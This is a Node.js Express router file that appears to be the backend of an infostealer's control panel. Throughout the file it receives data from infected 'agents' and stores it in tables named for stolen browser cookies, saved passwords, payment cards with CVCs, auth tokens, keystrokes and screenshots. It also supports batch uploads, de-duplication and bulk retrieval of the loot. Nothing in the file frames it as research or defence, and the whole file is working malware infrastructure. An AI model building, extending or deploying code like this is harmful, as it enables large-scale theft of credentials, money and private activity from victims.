const express = require('express');
const db = require('../database');
const { verifyToken } = require('./auth');
const crypto = require('crypto');
const router = express.Router();

// ============================================
// HELPER: Generate Fingerprint
// ============================================
function generateFingerprint(agentId, data, type) {
    let str = `${agentId}|`;
    
    if (type === 'cookie') {
        str += `${data.host || ''}|${data.name || ''}|${data.path || '/'}|${data.value || ''}`;
    } else if (type === 'password') {
        str += `${data.url || ''}|${data.username || ''}|${data.password || ''}`;
    } else if (type === 'card') {
        str += `${data.card_number || ''}|${data.card_name || ''}`;
    } else if (type === 'token') {
        str += `${data.service || ''}|${data.token || ''}`;
    }
    
    return crypto.createHash('sha256').update(str).digest('hex');
}

// ============================================
// HELPER: Check if fingerprint exists
// ============================================
async function fingerprintExists(table, agentId, fingerprint) {
    return new Promise((resolve, reject) => {
        db.get(
            `SELECT id FROM ${table} WHERE agentId = ? AND fingerprint = ? LIMIT 1`,
            [agentId, fingerprint],
            (err, row) => {
                if (err) reject(err);
                else resolve(!!row);
            }
        );
    });
}

// ============================================
// ORIGINAL ROUTE 1: SAVE COOKIE (WITH DUPLICATE CHECK)
// ============================================
router.post('/cookies', verifyToken, async (req, res) => {
    try {
        const { agentId, cookie } = req.body;
        
        if (!agentId || !cookie) {
            return res.status(400).json({ error: 'agentId and cookie required' });
        }
        
        const fingerprint = generateFingerprint(agentId, cookie, 'cookie');
        
        // ─── CHECK IF ALREADY EXISTS ──────────────────────────────
        const exists = await fingerprintExists('stolen_cookies', agentId, fingerprint);
        
        if (exists) {
            return res.json({ 
                success: true, 
                duplicate: true,
                saved: 0,
                message: 'Cookie already exists, skipped'
            });
        }
        // ────────────────────────────────────────────────────────────
        
        const sql = `
            INSERT INTO stolen_cookies (
                agentId, fingerprint, host, name, value, path, 
                secure, httpOnly, is_secure, is_httponly, 
                expires, same_site, priority, raw_data, stolen_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `;
        
        const result = await new Promise((resolve, reject) => {
            db.run(sql, [
                agentId,
                fingerprint,
                cookie.host || cookie.domain,
                cookie.name,
                cookie.value,
                cookie.path || '/',
                cookie.secure || cookie.is_secure || false,
                cookie.httpOnly || cookie.is_httponly || false,
                cookie.is_secure || false,
                cookie.is_httponly || false,
                cookie.expires || cookie.expirationDate,
                cookie.same_site || null,
                cookie.priority || null,
                JSON.stringify(cookie)
            ], function(err) {
                if (err) reject(err);
                else resolve(this);
            });
        });
        
        res.json({ 
            success: true, 
            id: result.lastID,
            saved: 1,
            duplicate: false
        });
        
    } catch (error) {
        console.error('Save cookie error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 2: SAVE PASSWORD (WITH DUPLICATE CHECK)
// ============================================
router.post('/passwords', verifyToken, async (req, res) => {
    try {
        const { agentId, password } = req.body;
        
        if (!agentId || !password) {
            return res.status(400).json({ error: 'agentId and password required' });
        }
        
        const fingerprint = generateFingerprint(agentId, password, 'password');
        
        // ─── CHECK IF ALREADY EXISTS ──────────────────────────────
        const exists = await fingerprintExists('stolen_passwords', agentId, fingerprint);
        
        if (exists) {
            return res.json({ 
                success: true, 
                duplicate: true,
                saved: 0,
                message: 'Password already exists, skipped'
            });
        }
        // ────────────────────────────────────────────────────────────
        
        const sql = `
            INSERT INTO stolen_passwords (
                agentId, fingerprint, url, username, password, 
                user, pass, origin_url, username_value, 
                password_value, action_url, input_element, 
                raw_data, stolen_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `;
        
        const result = await new Promise((resolve, reject) => {
            db.run(sql, [
                agentId,
                fingerprint,
                password.url || password.origin_url,
                password.username || password.user || '',
                password.password || password.pass || '',
                password.user || '',
                password.pass || '',
                password.origin_url || '',
                password.username_value || '',
                password.password_value || '',
                password.action_url || null,
                password.input_element || null,
                JSON.stringify(password)
            ], function(err) {
                if (err) reject(err);
                else resolve(this);
            });
        });
        
        res.json({ 
            success: true, 
            id: result.lastID,
            saved: 1,
            duplicate: false
        });
        
    } catch (error) {
        console.error('Save password error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 3: SAVE CARD (WITH DUPLICATE CHECK)
// ============================================
router.post('/cards', verifyToken, async (req, res) => {
    try {
        const { agentId, card } = req.body;
        
        if (!agentId || !card) {
            return res.status(400).json({ error: 'agentId and card required' });
        }
        
        const fingerprint = generateFingerprint(agentId, card, 'card');
        
        // ─── CHECK IF ALREADY EXISTS ──────────────────────────────
        const exists = await fingerprintExists('stolen_cards', agentId, fingerprint);
        
        if (exists) {
            return res.json({ 
                success: true, 
                duplicate: true,
                saved: 0,
                message: 'Card already exists, skipped'
            });
        }
        // ────────────────────────────────────────────────────────────
        
        const sql = `
            INSERT INTO stolen_cards (
                agentId, fingerprint, card_number, card_name, expiration,
                month, year, cvc, name_on_card, raw_data, stolen_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `;
        
        const result = await new Promise((resolve, reject) => {
            db.run(sql, [
                agentId,
                fingerprint,
                card.number || card.card_number,
                card.name || card.name_on_card,
                card.expiration || `${card.month}/${card.year}`,
                card.month || '',
                card.year || '',
                card.cvc || '',
                card.name_on_card || card.name || '',
                JSON.stringify(card)
            ], function(err) {
                if (err) reject(err);
                else resolve(this);
            });
        });
        
        res.json({ 
            success: true, 
            id: result.lastID,
            saved: 1,
            duplicate: false
        });
        
    } catch (error) {
        console.error('Save card error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 4: SAVE TOKEN (WITH DUPLICATE CHECK)
// ============================================
router.post('/tokens', verifyToken, async (req, res) => {
    try {
        const { agentId, token } = req.body;
        
        if (!agentId || !token) {
            return res.status(400).json({ error: 'agentId and token required' });
        }
        
        const fingerprint = generateFingerprint(agentId, token, 'token');
        
        // ─── CHECK IF ALREADY EXISTS ──────────────────────────────
        const exists = await fingerprintExists('stolen_tokens', agentId, fingerprint);
        
        if (exists) {
            return res.json({ 
                success: true, 
                duplicate: true,
                saved: 0,
                message: 'Token already exists, skipped'
            });
        }
        // ────────────────────────────────────────────────────────────
        
        const sql = `
            INSERT INTO stolen_tokens (
                agentId, fingerprint, service, token, binding_key, raw_data, stolen_at
            ) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `;
        
        const result = await new Promise((resolve, reject) => {
            db.run(sql, [
                agentId,
                fingerprint,
                token.service,
                token.token,
                token.binding_key,
                JSON.stringify(token)
            ], function(err) {
                if (err) reject(err);
                else resolve(this);
            });
        });
        
        res.json({ 
            success: true, 
            id: result.lastID,
            saved: 1,
            duplicate: false
        });
        
    } catch (error) {
        console.error('Save token error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 5: SAVE KEYSTROKES
// ============================================
router.post('/keystrokes', verifyToken, async (req, res) => {
    try {
        const { agentId, keystrokes, window, timestamp } = req.body;
        
        if (!agentId || !keystrokes) {
            return res.status(400).json({ error: 'agentId and keystrokes required' });
        }
        
        const sql = `
            INSERT INTO stolen_keystrokes (agentId, keystrokes, window, captured_at)
            VALUES (?, ?, ?, ?)
        `;
        
        db.run(sql, [agentId, keystrokes, window || 'Unknown', timestamp || new Date().toISOString()], function(err) {
            if (err) {
                console.error('Save keystrokes error:', err);
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true, id: this.lastID });
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 6: SAVE SCREENSHOT
// ============================================
router.post('/screenshots', verifyToken, async (req, res) => {
    try {
        const { agentId, screenshot, timestamp } = req.body;
        
        if (!agentId || !screenshot) {
            return res.status(400).json({ error: 'agentId and screenshot required' });
        }
        
        const sql = `
            INSERT INTO stolen_screenshots (agentId, screenshot_data, captured_at)
            VALUES (?, ?, ?)
        `;
        
        db.run(sql, [agentId, screenshot, timestamp || new Date().toISOString()], function(err) {
            if (err) {
                console.error('Save screenshot error:', err);
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true, id: this.lastID });
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 7: GET ALL DATA
// ============================================
router.get('/all', verifyToken, async (req, res) => {
    try {
        const cookies = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_cookies ORDER BY stolen_at DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const passwords = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_passwords ORDER BY stolen_at DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const cards = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_cards ORDER BY stolen_at DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const tokens = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_tokens ORDER BY stolen_at DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const screenshots = await new Promise((resolve, reject) => {
            db.all('SELECT id, agentId, screenshot_data, captured_at FROM stolen_screenshots ORDER BY captured_at DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const keystrokes = await new Promise((resolve, reject) => {
            db.all('SELECT id, agentId, keystrokes, window, captured_at FROM stolen_keystrokes ORDER BY captured_at DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        res.json({ cookies, passwords, cards, tokens, screenshots, keystrokes });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 8: GET ALL DATA FOR AGENT
// ============================================
router.get('/all/:agentId', verifyToken, async (req, res) => {
    try {
        const { agentId } = req.params;
        const { limit = 100 } = req.query;
        
        const cookies = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_cookies WHERE agentId = ? ORDER BY stolen_at DESC LIMIT ?', [agentId, limit], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const passwords = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_passwords WHERE agentId = ? ORDER BY stolen_at DESC LIMIT ?', [agentId, limit], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const cards = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_cards WHERE agentId = ? ORDER BY stolen_at DESC LIMIT ?', [agentId, limit], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const keystrokes = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM stolen_keystrokes WHERE agentId = ? ORDER BY captured_at DESC LIMIT ?', [agentId, limit], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        const screenshots = await new Promise((resolve, reject) => {
            db.all('SELECT id, agentId, captured_at FROM stolen_screenshots WHERE agentId = ? ORDER BY captured_at DESC LIMIT ?', [agentId, limit], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        res.json({ cookies, passwords, cards, keystrokes, screenshots });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ORIGINAL ROUTE 9: GET SCREENSHOT BY ID
// ============================================
router.get('/screenshot/:id', verifyToken, async (req, res) => {
    try {
        const { id } = req.params;
        
        const screenshot = await new Promise((resolve, reject) => {
            db.get('SELECT screenshot_data FROM stolen_screenshots WHERE id = ?', [id], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        });
        
        if (!screenshot) {
            return res.status(404).json({ error: 'Screenshot not found' });
        }
        
        res.json({ screenshot: screenshot.screenshot_data });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// BATCH ROUTES WITH DUPLICATE CHECK
// ============================================

// BATCH COOKIES (WITH DUPLICATE CHECK)
router.post('/cookies/batch', verifyToken, async (req, res) => {
    try {
        const { agentId, cookies } = req.body;
        
        if (!agentId || !Array.isArray(cookies) || cookies.length === 0) {
            return res.status(400).json({ error: 'agentId and cookies array required' });
        }
        
        if (cookies.length > 1000) {
            return res.status(400).json({ error: 'Maximum 1000 cookies per batch' });
        }
        
        let inserted = 0;
        let duplicates = 0;
        let errors = 0;
        const duplicateItems = [];
        const insertedItems = [];
        
        // ─── START TRANSACTION ───────────────────────────────────────
        await new Promise((resolve, reject) => {
            db.run('BEGIN TRANSACTION', (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
        // ────────────────────────────────────────────────────────────
        
        try {
            for (const cookie of cookies) {
                try {
                    if (!cookie.name || !cookie.value) {
                        errors++;
                        continue;
                    }
                    
                    const fingerprint = generateFingerprint(agentId, cookie, 'cookie');
                    
                    // ─── CHECK IF ALREADY EXISTS ──────────────────────
                    const exists = await fingerprintExists('stolen_cookies', agentId, fingerprint);
                    
                    if (exists) {
                        duplicates++;
                        duplicateItems.push(cookie.name);
                        continue;  // ─── SKIP DUPLICATES ──────────────
                    }
                    // ────────────────────────────────────────────────────
                    
                    // ─── INSERT ONLY IF NEW ──────────────────────────
                    await new Promise((resolve, reject) => {
                        db.run(
                            `INSERT INTO stolen_cookies (
                                agentId, fingerprint, host, name, value, path, 
                                secure, httpOnly, is_secure, is_httponly, 
                                expires, same_site, priority, raw_data, stolen_at
                            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
                            [
                                agentId,
                                fingerprint,
                                cookie.host || cookie.domain || null,
                                cookie.name,
                                cookie.value,
                                cookie.path || '/',
                                cookie.secure || cookie.is_secure ? 1 : 0,
                                cookie.httpOnly || cookie.is_httponly ? 1 : 0,
                                cookie.is_secure ? 1 : 0,
                                cookie.is_httponly ? 1 : 0,
                                cookie.expires || cookie.expirationDate || null,
                                cookie.same_site || null,
                                cookie.priority || null,
                                JSON.stringify(cookie)
                            ],
                            function(err) {
                                if (err) reject(err);
                                else {
                                    inserted++;
                                    insertedItems.push(cookie.name);
                                    resolve();
                                }
                            }
                        );
                    });
                    // ────────────────────────────────────────────────────
                    
                } catch (error) {
                    errors++;
                }
            }
            
            // ─── COMMIT TRANSACTION ──────────────────────────────────
            await new Promise((resolve, reject) => {
                db.run('COMMIT', (err) => {
                    if (err) reject(err);
                    else resolve();
                });
            });
            // ────────────────────────────────────────────────────────────
            
            res.json({
                success: true,
                processed: cookies.length,
                inserted: inserted,
                duplicates: duplicates,
                errors: errors,
                duplicate_items: duplicateItems.slice(0, 10), // Show first 10
                inserted_items: insertedItems.slice(0, 10)
            });
            
        } catch (error) {
            // ─── ROLLBACK ON ERROR ──────────────────────────────────
            await new Promise((resolve) => {
                db.run('ROLLBACK', () => resolve());
            });
            throw error;
            // ────────────────────────────────────────────────────────────
        }
        
    } catch (error) {
        console.error('Batch cookie error:', error);
        res.status(500).json({ error: error.message });
    }
});

// BATCH PASSWORDS (WITH DUPLICATE CHECK)
router.post('/passwords/batch', verifyToken, async (req, res) => {
    try {
        const { agentId, passwords } = req.body;
        
        if (!agentId || !Array.isArray(passwords) || passwords.length === 0) {
            return res.status(400).json({ error: 'agentId and passwords array required' });
        }
        
        if (passwords.length > 1000) {
            return res.status(400).json({ error: 'Maximum 1000 passwords per batch' });
        }
        
        let inserted = 0;
        let duplicates = 0;
        let errors = 0;
        
        await new Promise((resolve, reject) => {
            db.run('BEGIN TRANSACTION', (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
        
        try {
            for (const pwd of passwords) {
                try {
                    if (!pwd.password) {
                        errors++;
                        continue;
                    }
                    
                    const fingerprint = generateFingerprint(agentId, pwd, 'password');
                    
                    // ─── CHECK IF ALREADY EXISTS ──────────────────────
                    const exists = await fingerprintExists('stolen_passwords', agentId, fingerprint);
                    
                    if (exists) {
                        duplicates++;
                        continue;  // ─── SKIP DUPLICATES ──────────────
                    }
                    // ────────────────────────────────────────────────────
                    
                    await new Promise((resolve, reject) => {
                        db.run(
                            `INSERT INTO stolen_passwords (
                                agentId, fingerprint, url, username, password, 
                                user, pass, origin_url, username_value, 
                                password_value, action_url, input_element, 
                                raw_data, stolen_at
                            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
                            [
                                agentId,
                                fingerprint,
                                pwd.url || pwd.origin_url || '',
                                pwd.username || pwd.user || '',
                                pwd.password || pwd.pass || '',
                                pwd.user || '',
                                pwd.pass || '',
                                pwd.origin_url || '',
                                pwd.username_value || '',
                                pwd.password_value || '',
                                pwd.action_url || null,
                                pwd.input_element || null,
                                JSON.stringify(pwd)
                            ],
                            function(err) {
                                if (err) reject(err);
                                else {
                                    inserted++;
                                    resolve();
                                }
                            }
                        );
                    });
                    
                } catch (error) {
                    errors++;
                }
            }
            
            await new Promise((resolve, reject) => {
                db.run('COMMIT', (err) => {
                    if (err) reject(err);
                    else resolve();
                });
            });
            
            res.json({
                success: true,
                processed: passwords.length,
                inserted: inserted,
                duplicates: duplicates,
                errors: errors
            });
            
        } catch (error) {
            await new Promise((resolve) => {
                db.run('ROLLBACK', () => resolve());
            });
            throw error;
        }
        
    } catch (error) {
        console.error('Batch password error:', error);
        res.status(500).json({ error: error.message });
    }
});

// BATCH CARDS (WITH DUPLICATE CHECK)
router.post('/cards/batch', verifyToken, async (req, res) => {
    try {
        const { agentId, cards } = req.body;
        
        if (!agentId || !Array.isArray(cards) || cards.length === 0) {
            return res.status(400).json({ error: 'agentId and cards array required' });
        }
        
        if (cards.length > 1000) {
            return res.status(400).json({ error: 'Maximum 1000 cards per batch' });
        }
        
        let inserted = 0;
        let duplicates = 0;
        let errors = 0;
        
        await new Promise((resolve, reject) => {
            db.run('BEGIN TRANSACTION', (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
        
        try {
            for (const card of cards) {
                try {
                    const cardNumber = card.number || card.card_number || '';
                    if (!cardNumber) {
                        errors++;
                        continue;
                    }
                    
                    const fingerprint = generateFingerprint(agentId, card, 'card');
                    
                    // ─── CHECK IF ALREADY EXISTS ──────────────────────
                    const exists = await fingerprintExists('stolen_cards', agentId, fingerprint);
                    
                    if (exists) {
                        duplicates++;
                        continue;  // ─── SKIP DUPLICATES ──────────────
                    }
                    // ────────────────────────────────────────────────────
                    
                    await new Promise((resolve, reject) => {
                        db.run(
                            `INSERT INTO stolen_cards (
                                agentId, fingerprint, card_number, card_name, expiration,
                                month, year, cvc, name_on_card, raw_data, stolen_at
                            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
                            [
                                agentId,
                                fingerprint,
                                cardNumber,
                                card.name || card.name_on_card || card.card_name || '',
                                card.expiration || `${card.month || ''}/${card.year || ''}`,
                                card.month || '',
                                card.year || '',
                                card.cvc || '',
                                card.name_on_card || card.name || '',
                                JSON.stringify(card)
                            ],
                            function(err) {
                                if (err) reject(err);
                                else {
                                    inserted++;
                                    resolve();
                                }
                            }
                        );
                    });
                    
                } catch (error) {
                    errors++;
                }
            }
            
            await new Promise((resolve, reject) => {
                db.run('COMMIT', (err) => {
                    if (err) reject(err);
                    else resolve();
                });
            });
            
            res.json({
                success: true,
                processed: cards.length,
                inserted: inserted,
                duplicates: duplicates,
                errors: errors
            });
            
        } catch (error) {
            await new Promise((resolve) => {
                db.run('ROLLBACK', () => resolve());
            });
            throw error;
        }
        
    } catch (error) {
        console.error('Batch card error:', error);
        res.status(500).json({ error: error.message });
    }
});

// BATCH TOKENS (WITH DUPLICATE CHECK)
router.post('/tokens/batch', verifyToken, async (req, res) => {
    try {
        const { agentId, tokens } = req.body;
        
        if (!agentId || !Array.isArray(tokens) || tokens.length === 0) {
            return res.status(400).json({ error: 'agentId and tokens array required' });
        }
        
        if (tokens.length > 1000) {
            return res.status(400).json({ error: 'Maximum 1000 tokens per batch' });
        }
        
        let inserted = 0;
        let duplicates = 0;
        let errors = 0;
        
        await new Promise((resolve, reject) => {
            db.run('BEGIN TRANSACTION', (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
        
        try {
            for (const token of tokens) {
                try {
                    if (!token.token) {
                        errors++;
                        continue;
                    }
                    
                    const fingerprint = generateFingerprint(agentId, token, 'token');
                    
                    // ─── CHECK IF ALREADY EXISTS ──────────────────────
                    const exists = await fingerprintExists('stolen_tokens', agentId, fingerprint);
                    
                    if (exists) {
                        duplicates++;
                        continue;  // ─── SKIP DUPLICATES ──────────────
                    }
                    // ────────────────────────────────────────────────────
                    
                    await new Promise((resolve, reject) => {
                        db.run(
                            `INSERT INTO stolen_tokens (
                                agentId, fingerprint, service, token, binding_key, raw_data, stolen_at
                            ) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
                            [
                                agentId,
                                fingerprint,
                                token.service || '',
                                token.token,
                                token.binding_key || '',
                                JSON.stringify(token)
                            ],
                            function(err) {
                                if (err) reject(err);
                                else {
                                    inserted++;
                                    resolve();
                                }
                            }
                        );
                    });
                    
                } catch (error) {
                    errors++;
                }
            }
            
            await new Promise((resolve, reject) => {
                db.run('COMMIT', (err) => {
                    if (err) reject(err);
                    else resolve();
                });
            });
            
            res.json({
                success: true,
                processed: tokens.length,
                inserted: inserted,
                duplicates: duplicates,
                errors: errors
            });
            
        } catch (error) {
            await new Promise((resolve) => {
                db.run('ROLLBACK', () => resolve());
            });
            throw error;
        }
        
    } catch (error) {
        console.error('Batch token error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// DELETE DUPLICATES (CLEANUP)
// ============================================
router.delete('/duplicates/:agentId/:table', verifyToken, async (req, res) => {
    try {
        const { agentId, table } = req.params;
        
        const validTables = ['cookies', 'passwords', 'cards', 'tokens'];
        if (!validTables.includes(table)) {
            return res.status(400).json({ error: 'Invalid table. Use: cookies, passwords, cards, tokens' });
        }
        
        const tableMap = {
            cookies: 'stolen_cookies',
            passwords: 'stolen_passwords',
            cards: 'stolen_cards',
            tokens: 'stolen_tokens'
        };
        
        const tableName = tableMap[table];
        
        // Count before
        const before = await new Promise((resolve, reject) => {
            db.get(`SELECT COUNT(*) as count FROM ${tableName} WHERE agentId = ?`, [agentId], (err, row) => {
                if (err) reject(err);
                else resolve(row.count);
            });
        });
        
        // Delete duplicates (keep newest)
        const result = await new Promise((resolve, reject) => {
            db.run(
                `DELETE FROM ${tableName} 
                 WHERE agentId = ? 
                 AND id NOT IN (
                     SELECT MAX(id) 
                     FROM ${tableName} 
                     WHERE agentId = ? 
                     GROUP BY fingerprint
                 )`,
                [agentId, agentId],
                function(err) {
                    if (err) reject(err);
                    else resolve(this);
                }
            );
        });
        
        // Count after
        const after = await new Promise((resolve, reject) => {
            db.get(`SELECT COUNT(*) as count FROM ${tableName} WHERE agentId = ?`, [agentId], (err, row) => {
                if (err) reject(err);
                else resolve(row.count);
            });
        });
        
        res.json({
            success: true,
            table: tableName,
            agentId: agentId,
            before: before,
            deleted: result.changes,
            after: after,
            message: `Deleted ${result.changes} duplicate entries from ${tableName}`
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;